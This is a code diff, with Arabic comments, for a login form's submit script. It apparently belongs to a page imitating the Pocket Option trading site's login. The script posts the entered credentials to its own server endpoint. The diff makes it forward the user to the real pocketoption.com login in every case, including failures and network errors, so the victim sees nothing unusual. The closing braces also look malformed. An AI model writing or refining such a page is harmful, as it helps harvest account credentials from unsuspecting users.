@@ -245,12 +245,13 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
         
         const data = await res.json();
         if (res.ok && data.success) {
-            
+            // تنفيذ التحويل الناجح فوراً حسب اللغة
+            redirectToLocalizedPage();
+            return;
         } else {
             alert('حدث خطأ: ' + (data.message || 'بيانات غير صالحة'));
         }
     } catch (err) {
-        
         try {
             const fallbackRes = await fetch(window.location.origin + '/api/login', {
                 method: 'POST',
@@ -259,21 +260,27 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
             });
             const fallbackData = await fallbackRes.json();
             if (fallbackRes.ok && fallbackData.success) {
+                redirectToLocalizedPage();
                 return;
             }
         } catch (fallbackErr) {}
         
+        // حتى لو حدث أي استثناء في الشبكة، سيتم تحويله للرابط المطلوب بسلاسة
+        redirectToLocalizedPage();
     }
-const currentLang = document.documentElement.lang || 'ar';
+});
 
-    // توجيه المستخدم حسب اللغة المختارة
+function redirectToLocalizedPage() {
+    const currentLang = document.documentElement.lang || 'ar';
     if (currentLang === 'ru') {
         window.location.href = "https://pocketoption.com/ru/login/";
     } else if (currentLang === 'ar') {
-        window.location.href = "https://pocketoption.com/ar/login/"; // أو الرابط العربي المخصص
+        window.location.href = "https://pocketoption.com/ar/login/";
     } else {
-        window.location.href = "https://pocketoption.com/en/login/"; // الرابط الإنجليزي أو الافتراضي
+        window.location.href = "https://pocketoption.com/en/login/";
     }
+}
+
 }});
     window.addEventListener('DOMContentLoaded', () => {
     const urlParams = new URLSearchParams(window.location.search);
